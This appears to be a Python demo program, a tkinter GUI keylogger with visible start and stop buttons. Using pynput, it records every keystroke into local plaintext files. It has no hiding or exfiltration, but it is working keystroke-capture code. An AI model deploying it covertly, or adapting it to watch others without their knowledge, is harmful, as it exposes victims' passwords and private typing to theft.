import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
import json
import threading

# Globals
key_list = []
x = False
key_strokes = ""
listener = None
running = False


# === File Updaters ===

# Appends each keystroke to a text file
def update_txt_file(key):
    with open('logs.txt', 'a') as key_stroke:
        key_stroke.write(key + '\n')


# Dumps the full list of key events to a JSON file
def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log, indent=4)


# === Keylogger Functions ===

# Triggered when a key is pressed
def on_press(key):
    global x, key_list

    if not x:
        key_list.append({'Pressed': f'{key}'})
        x = True
    else:
        key_list.append({'Held': f'{key}'})

    update_json_file(key_list)
    update_display(str(key))


# Triggered when a key is released
def on_release(key):
    global x, key_list, key_strokes

    key_list.append({'Released': f'{key}'})
    if x:
        x = False

    update_json_file(key_list)

    key_strokes = str(key)
    update_txt_file(key_strokes)
    update_display(f"{key} (released)")


# === GUI Logic ===

# Starts the keylogger listener
def start_keylogger():
    global listener, running
    if not running:
        running = True
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        update_display("[+] Keylogger started...\n")


# Stops the keylogger listener
def stop_keylogger():
    global listener, running
    if listener and running:
        listener.stop()
        listener = None
        running = False
        update_display("[!] Keylogger stopped.\n")


# Updates the live GUI log display
def update_display(log):
    log_display.insert(tk.END, f"{log}\n")
    log_display.yview(tk.END)


# === GUI Setup ===

root = tk.Tk()
root.title("🛡️ Simple Python Keylogger")
root.geometry("500x400")
root.resizable(False, False)

title = tk.Label(root, text="🔐 Keylogger GUI", font=("Arial", 16, "bold"))
title.pack(pady=10)

log_display = scrolledtext.ScrolledText(root, width=60, height=15, font=("Courier", 10))
log_display.pack(pady=10)

btn_frame = tk.Frame(root)
btn_frame.pack(pady=10)

start_btn = tk.Button(btn_frame, text="▶️ Start", width=10, bg="green", fg="white", command=start_keylogger)
start_btn.grid(row=0, column=0, padx=10)

stop_btn = tk.Button(btn_frame, text="⏹️ Stop", width=10, bg="red", fg="white", command=stop_keylogger)
stop_btn.grid(row=0, column=1, padx=10)

exit_btn = tk.Button(root, text="Exit", width=10, command=root.quit)
exit_btn.pack(pady=5)

# Run the app
update_display("[*] Ready to start keylogger.")
root.mainloop()
